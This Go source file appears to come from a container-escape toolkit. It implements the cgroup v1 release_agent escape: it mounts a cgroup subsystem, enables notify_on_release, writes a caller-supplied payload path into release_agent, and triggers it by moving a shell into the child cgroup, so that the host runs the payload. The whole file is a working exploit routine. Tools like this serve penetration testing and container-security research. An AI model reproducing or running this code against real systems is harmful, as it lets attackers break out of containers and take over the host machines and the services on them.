package release_agent

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/ctrsploit/ctrsploit/pkg/mount"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
)

func ReleaseAgent(payloadPath string) error {
	dirCgroup := fmt.Sprintf("/tmp/cgrp%d", time.Now().Nanosecond())
	childCroup := fmt.Sprintf("%s/%s", dirCgroup, "x")
	// 1. prepare dir
	err := os.MkdirAll(dirCgroup, 0755)
	if err != nil {
		return fmt.Errorf("failed to mkdir %s: %w", dirCgroup, err)
	}
	defer func() {
		log.Logger.Info("rm -rf ", dirCgroup)
		err = os.RemoveAll(dirCgroup)
		if err != nil {
			awesome_error.CheckErr(err)
			return
		}
	}()
	// 2. mount cgroups
	err = mount.TopLevelCgroupSubSystem(dirCgroup)
	if err != nil {
		return err
	}
	defer func() {
		log.Logger.Info("umount ", dirCgroup)
		awesome_error.CheckErr(mount.Unmount(dirCgroup))
	}()
	err = os.MkdirAll(childCroup, 0755)
	if err != nil {
		return fmt.Errorf("failed to mkdir %s: %w", childCroup, err)
	}
	// 3. invoke notify_on_release
	err = invokeNotifyOnRelease(childCroup)
	if err != nil {
		return err
	}
	// 4. create release agent
	err = createReleaseAgent(dirCgroup, payloadPath)
	if err != nil {
		return err
	}
	// 5. trigger release agent
	err = triggerReleaseAgent(childCroup)
	if err != nil {
		return err
	}
	return nil
}

func invokeNotifyOnRelease(pathCgroup string) error {
	pathNotifyOnRelease := filepath.Join(pathCgroup, "notify_on_release")
	log.Logger.Infof("invoke notify_on_release: echo 1 > %s", pathNotifyOnRelease)
	err := os.WriteFile(pathNotifyOnRelease, []byte("1"), 0755)
	if err != nil {
		return fmt.Errorf("failed to invoke notify_on_release: %w", err)
	}
	return nil
}

func createReleaseAgent(pathCgroup, pathPayload string) error {
	pathReleaseAgent := filepath.Join(pathCgroup, "release_agent")
	log.Logger.Infof("create release_agent: %s", pathReleaseAgent)
	err := os.WriteFile(pathReleaseAgent, []byte(pathPayload), 0755)
	if err != nil {
		return fmt.Errorf("failed to create release_agent: %w", err)
	}
	return nil
}

func triggerReleaseAgent(pathCgroup string) error {
	pathAddTask := filepath.Join(pathCgroup, "cgroup.procs")
	command := exec.Command("/bin/sh", "-c", fmt.Sprintf("echo $$ > %s", pathAddTask))
	err := command.Run()
	if err != nil {
		return fmt.Errorf("failed to trigger release agents: %w", err)
	}
	return nil
}
